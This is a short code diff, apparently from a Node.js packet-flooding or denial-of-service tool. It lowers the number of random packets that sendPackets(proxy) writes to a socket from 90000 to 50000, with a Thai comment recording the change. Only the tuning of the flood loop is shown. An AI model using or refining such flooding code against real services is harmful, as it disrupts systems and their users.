@@ -46,7 +46,7 @@ async function sendPackets(proxy) {
         };
 
         const socket = net.connect(options, () => {
-            for (let i = 0; i < 90000; i++) {
+            for (let i = 0; i < 50000; i++) {  // เปลี่ยนจาก 90000 เป็น 50000
                 const msg = packets[Math.floor(Math.random() * packets.length)];
                 socket.write(msg);
 
